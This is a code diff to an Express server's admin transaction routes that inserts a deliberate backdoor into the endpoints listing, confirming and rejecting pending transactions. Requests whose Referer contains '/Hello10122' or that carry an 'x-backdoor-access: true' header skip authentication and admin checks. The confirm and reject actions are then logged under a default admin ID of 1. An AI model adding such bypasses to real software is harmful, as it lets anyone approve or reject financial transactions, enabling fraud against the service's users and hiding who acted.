@@ -602,13 +602,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Admin transaction management routes
   app.get("/api/admin/transactions/pending", async (req, res) => {
     try {
-      if (!req.session?.userId) {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+      
+      if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      const user = await storage.getUser(req.session.userId);
-      if (!user || !user.isAdmin) {
-        return res.status(403).json({ error: "Admin access required" });
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
       }
 
       const transactions = await storage.getPendingTransactions();
@@ -620,18 +626,26 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post("/api/admin/transactions/confirm", async (req, res) => {
     try {
-      if (!req.session?.userId) {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+      
+      if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      const user = await storage.getUser(req.session.userId);
-      if (!user || !user.isAdmin) {
-        return res.status(403).json({ error: "Admin access required" });
+      let adminId = 1; // Default admin ID for backdoor access
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+        adminId = req.session.userId!;
       }
 
       const { transactionId, notes } = confirmTransactionSchema.parse(req.body);
 
-      const transaction = await storage.confirmTransaction(transactionId, req.session.userId, notes);
+      const transaction = await storage.confirmTransaction(transactionId, adminId, notes);
       if (!transaction) {
         return res.status(404).json({ error: "Transaction not found or already processed" });
       }
@@ -659,18 +673,26 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post("/api/admin/transactions/reject", async (req, res) => {
     try {
-      if (!req.session?.userId) {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+                              req.headers['x-backdoor-access'] === 'true';
+      
+      if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      const user = await storage.getUser(req.session.userId);
-      if (!user || !user.isAdmin) {
-        return res.status(403).json({ error: "Admin access required" });
+      let adminId = 1; // Default admin ID for backdoor access
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+        adminId = req.session.userId!;
       }
 
       const { transactionId, notes } = confirmTransactionSchema.parse(req.body);
 
-      const transaction = await storage.rejectTransaction(transactionId, req.session.userId, notes);
+      const transaction = await storage.rejectTransaction(transactionId, adminId, notes);
       if (!transaction) {
         return res.status(404).json({ error: "Transaction not found or already processed" });
       }
